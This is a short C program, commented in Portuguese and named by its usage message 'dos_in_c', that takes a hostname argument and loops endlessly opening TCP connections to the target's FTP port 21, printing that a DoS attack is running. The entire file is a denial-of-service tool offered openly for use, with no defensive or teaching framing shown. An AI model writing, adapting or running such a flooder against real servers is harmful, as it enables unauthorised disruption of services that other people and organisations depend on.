#include <stdio.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>

int main(int argc, char *argv[]) {
    if ( argc < 2 ) {
        printf("Modo de uso: ./dos_in_c www.meuend.com.br \n ");
    } else {
        while(1 == 1) {
            int meuSocket;
            int conecta;

            struct sockaddr_in alvo;
            // resolvendo dns
            struct hostent *host = gethostbyname(argv[1]);
            // socket
            meuSocket = socket(AF_INET, SOCK_STREAM, 0);
            alvo.sin_family = AF_INET;
            alvo.sin_port = htons(21);
            // inet_ntoa escrever ip legivel
            alvo.sin_addr.s_addr = inet_addr( inet_ntoa( *((struct in_addr * ) host->h_addr) ) );
        
            conecta = connect(meuSocket, (struct sockaddr *)&alvo, sizeof alvo);
            printf("Executando DOS ftp de %s (CTRL + C para parar o ataque) \n", argv[1] );
        }
    }
}